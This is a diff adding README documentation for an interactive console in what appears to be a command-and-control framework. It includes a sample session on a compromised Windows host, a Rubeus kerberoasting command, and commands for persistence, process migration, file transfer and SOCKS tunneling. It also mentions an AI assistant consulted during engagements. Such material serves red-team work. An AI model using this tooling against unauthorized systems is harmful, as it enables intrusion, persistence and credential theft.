@@ -735,6 +735,71 @@ new_section:
 
 ---
 
+## Interactive console
+
+Running `lilith` with no arguments drops into a Ligolo-style interactive console. The HTTPS server starts in a background thread — the terminal is never blocked. Readline history (`~/.lilith_console_history`) and tab completion are available throughout.
+
+```bash
+python3 lilith.py
+# or explicitly:
+python3 lilith.py console
+```
+
+```
+ _       ___   _       ___   _____  _  _
+) |     )_ _( ) |     )_ _( )__ __() () (
+| (__   _| |_ | (__   _| |_   | |  | -- |
+)____( )_____()____( )_____(  )_(  )_()_(
+
+  She existed before the first rule was written.
+  She will remain long after the last one is broken.
+
+lilith » serve
+[+] HTTPS server started on :8443  mgmt :8444
+
+lilith » sessions
+  #  ID        IP              Last seen
+  1  a3f8c1d2  10.10.10.45     2s ago
+
+lilith [a3f8c1d2] » whoami
+nt authority\system
+
+lilith [a3f8c1d2] » run Rubeus -- kerberoast /nowrap
+```
+
+### Console commands
+
+| Category | Command | Description |
+|---|---|---|
+| **Server** | `serve [--port P]` | Start HTTPS + mgmt servers in background |
+| | `status` | Show server and session status |
+| **Sessions** | `sessions` / `ls` | List active C2 sessions |
+| | `use <#\|id>` | Select session by index or ID prefix |
+| | `unuse` | Deselect current session |
+| **C2** | `<any command>` | Send command to active session |
+| | `run <TOOL> [-- params]` | Dispatch arsenal tool (auto-encodes) |
+| | `upload <local> <remote>` | Upload file to target |
+| | `download <remote> [local]` | Download file from target |
+| | `screenshot [out.bmp]` | Capture desktop |
+| | `migrate [proc.exe]` | Migrate to another process |
+| | `persist wmi\|run\|schtask\|wer` | Install persistence |
+| | `cleanup` | Remove staging files from target |
+| | `kill [SID]` | Kill a session |
+| **Tunneling** | `socks [PORT]` | Start SOCKS5 proxy (default 1080) |
+| | `nosocks` | Stop SOCKS5 for active session |
+| | `socks status` | Show active SOCKS5 proxies |
+| **Intelligence** | `ask <question>` | Consult Astaroth AI with session context |
+| | `findings [--session SID]` | List engagement findings |
+| | `find <text> [--sev high]` | Add finding for active session |
+| **Build** | `build <args>` | Run build command inline |
+| | `linux [--cat CAT]` | Linux arsenal with delivery one-liners |
+| **Other** | `timeout <sec>` | Set command wait timeout |
+| | `quit` / `exit` / Ctrl+C | Exit console (sessions stay alive) |
+
+> If a single session is active when the console starts, it is auto-selected.
+
+---
+
 ## C2 agent mode
 
 The runner supports an interactive HTTPS polling C2 loop.
